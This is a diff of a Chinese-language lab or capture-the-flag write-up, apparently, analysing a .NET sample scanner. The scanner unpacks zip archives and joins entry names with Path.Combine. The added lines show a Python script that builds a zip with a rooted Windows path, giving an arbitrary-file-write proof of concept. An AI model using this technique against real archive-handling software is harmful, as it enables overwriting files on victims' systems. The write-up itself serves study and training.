@@ -231,6 +231,44 @@ SampleScanner.exe: MS-DOS executable
 ```
 #### 该 dll 实际上是一个 .Net 程序集，因此我们可以使用像 dnspy 这样的工具来解编这个程序集并获取其库的源代码。而另一个可执行文件则是以原生 x64 机器代码编译的，这意味着我们不得不采用静态和动态分析的方式来理解其工作流程。不过，这种情况可能并非总是需要的——该可执行文件很可能只是 dll 的加载器，其中将包含工作流程的主要功能。
 #### 可以通过https://file.io进行隔空传送
+### 注：.exe 或 .dll在windows不能单一运行，需要目录完整和二进制文件传输完整！！！
+```
+tp> binary
+200 Type set to I.
+ftp> !mkdir app
+ftp> lcd app
+Local directory now: /home/syareya55/app
+ftp> cd app
+250 CWD command successful.
+ftp> mget *
+mget changelog [anpqy?]? 
+```
+```
+[★]$ tar -czvf app.tar.gz app
+```
+#### 二进制文件被破坏传输是不能如期执行.\SampleScanner.exe’命令的
+```
+PS C:\samples\app> .\SampleScanner.exe
+You must install or update .NET to run this application.
+
+App: C:\samples\app\SampleScanner.exe
+Architecture: x64
+Framework: 'Microsoft.NETCore.App', version '3.1.0' (x64)
+.NET location: C:\Program Files\dotnet\x64\
+
+The following frameworks were found:
+  8.0.25 at [C:\Program Files\dotnet\x64\shared\Microsoft.NETCore.App]
+  9.0.14 at [C:\Program Files\dotnet\x64\shared\Microsoft.NETCore.App]
+
+Learn more:
+https://aka.ms/dotnet/app-launch-failed
+
+To install missing framework, download:
+https://aka.ms/dotnet-core-applaunch?framework=Microsoft.NETCore.App&framework_version=3.1.0&arch=x64&rid=win-x64&os=win10
+```
+
+
+----------------------------
 ```
 C:\Users\11xiaohei\Downloads\changelog>dir
  
@@ -272,7 +310,8 @@ https://aka.ms/dotnet-core-applaunch?framework=Microsoft.NETCore.App&framework_v
 ```
 C:\Users\11xiaohei\Downloads\changelog>echo %PROCESSOR_ARCHITECTURE%
 ARM64
-//直接用 安装脚本 
+
+//直接用 安装脚本，可惜了这里安装的是我环境ARM64的dotnet,不是靶机需要的x64的dotnet
 PS C:\Users\11xiaohei> Invoke-WebRequest https://dot.net/v1/dotnet-install.ps1 -OutFile dotnet-install.ps1
 PS C:\Users\11xiaohei> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 PS C:\Users\11xiaohei> .\dotnet-install.ps1 -Runtime dotnet -Version 3.1.32 -Architecture arm64
@@ -281,18 +320,8 @@ PS C:\Users\11xiaohei> dotnet --list-runtimes
 Microsoft.AspNetCore.App 8.0.19 [C:\Program Files\dotnet\shared\Microsoft.AspNetCore.App]
 Microsoft.AspNetCore.App 9.0.8 [C:\Program Files\dotnet\shared\Microsoft.AspNetCore.App]
 Microsoft.NETCore.App 3.1.32 [C:\Users\11xiaohei\AppData\Local\Microsoft\dotnet\shared\Microsoft.NETCore.App]
-
-PS C:\Users\11xiaohei\downloads\changelog> dotnet SampleScanner.dll
-Unhandled exception. System.BadImageFormatException: Could not load file or assembly 'C:\Users\11xiaohei\downloads\changelog\SampleScanner.dll'. Format of the executable (.exe) or library (.dll) is invalid.
-File name: 'C:\Users\11xiaohei\downloads\changelog\SampleScanner.dll'
-
-PS C:\Users\11xiaohei\downloads\changelog> dotnet SampleScanner.exe
-Error:
-  An assembly specified in the application dependencies manifest (SampleScanner.deps.json) has already been found but with a different file extension:
-    package: 'SampleScanner', version: '1.0.0'
-    path: 'SampleScanner.dll'
-    previously found assembly: 'C:\Users\11xiaohei\downloads\changelog\SampleScanner.exe'
 ```
+
 #### 下载Microsoft.NETCore.App&framework_version=3.1.0之后，如果我们使用工具“进程监视器Process Monitor”，并仅筛选出显示与“进程名称为 SampleScanner.exe”相匹配的结果，例如这样：
 https://learn.microsoft.com/en-us/sysinternals/downloads/procmon 
 #### 解压之后运行Procmon.exe
@@ -301,6 +330,20 @@ https://learn.microsoft.com/en-us/sysinternals/downloads/procmon
 #### 考 .NET 程序分析能力，而不是让你实际运行；
 #### 现在我们可以对 SampleScanner.dll 进行反编译，并查看源代码以找出任何我们能够利用的潜在漏洞
 #### dnSpy | ILSpy
+https://github.com/icsharpcode/ILSpy
+```
+// This file does not contain a managed assembly.
+
+System.BadImageFormatException: Invalid PE signature.
+   at ICSharpCode.ILSpyX.LoadedAssembly.LoadAsync(Task`1 streamTask) in /_/ICSharpCode.ILSpyX/LoadedAssembly.cs:line 387
+   at ICSharpCode.ILSpy.TreeNodes.AssemblyTreeNode.Decompile(Language language, ITextOutput output, DecompilationOptions options)
+
+PS C:\Users\11xiaohei> Get-Content C:\Users\11xiaohei\Downloads\changelog\SampleScanner.dll -Encoding Byte -TotalCount 2
+77
+90
+
+//编译打不开的花，就换另一种编译或者重新下载新的.dll ,再不济就往下走
+```
 #### 我们可以看到，该可执行文件确实加载了 SampleScanner.dll 文件。
 ________
 #### 首先生成一个包含 EICAR 测试文件字符串的字节数组，然后该库会继续从 C:\samples\queue 目录中检索文件。接下来，它会遍历检索到的文件名，如果这些文件以.zip 扩展名结尾，则将归档文件的内容提取到 C:\samples\queue 目录下，然后删除原始文件（即归档文件）。最后，对于从归档文件中提取出来的每个文件，它会将其与 EICAR 测试字符串进行比较。如果EICAR 模式存在于所获取文件的字节表示形式中，这会将该文件移动至恶意文件区域。文件夹。如果不是这样，它就会将该文件移动到“良性”文件夹中。
@@ -334,5 +377,28 @@ string fullPath = Path.Combine(paths);
 Console.WriteLine(fullPath);
 ```
 #### 这种情况之所以危险，是因为我们实际上可以创建一个包含根路径的文件名，并将其归档。当 Path 创建路径组合的字符串时，归档文件的内容将写入归档文件名中包含的路径，从而允许我们在系统上写入任意文件。我们可以在本地机器上测试这一点。首先，我们需要创建一个文件名包含路径的文件。我们可以使用 Python 来实现。首先，我们将为测试目的创建一个测试文件：
-
+```
+[★]$ echo 'this is a test file' > test.txt
+```
 #### 我们将使用以下自定义脚本创建一个包含测试文件的压缩文件，同时将该文件名修改为 C:\Users\rogue\Desktop\test.txt 。
+```
+[★]$ cat file_path.py
+import zipfile
+
+source = r"test.txt"
+zip_name = r"test.zip"
+
+with zipfile.ZipFile(zip_name,"w", zipfile.ZIP_DEFLATED) as zf:
+    zf.write(source, arcname=r"C:\Users\rogue\Desktop\test.txt")
+```
+#### 如果我们运行此脚本，然后解压我们创建的存档文件，就可以看到文件名确实是 C:\Users\rogue\Desktop\test.txt 。
+```
+[★]$ python3 file_path.py
+[★]$ unzip test.zip
+Archive:  test.zip
+  inflating: C:\Users\rogue\Desktop\test.txt
+[★]$ ls -la 'C:\Users\rogue\Desktop\test.txt'
+-rw-r--r-- 1 syareya55 syareya55 20 Mar 15 02:02 'C:\Users\rogue\Desktop\test.txt'
+```
+#### 现在，我们将把我们的存档移动到本地 Windows 测试实例中的 C:\samples\queue 文件夹，SampleScanner.dll 就是期望在那里找到存档的。
+#### 现在，如果我们运行“SampleScanner.exe”程序，就会发现文件“test.txt”将会被创建在指定的路径中。
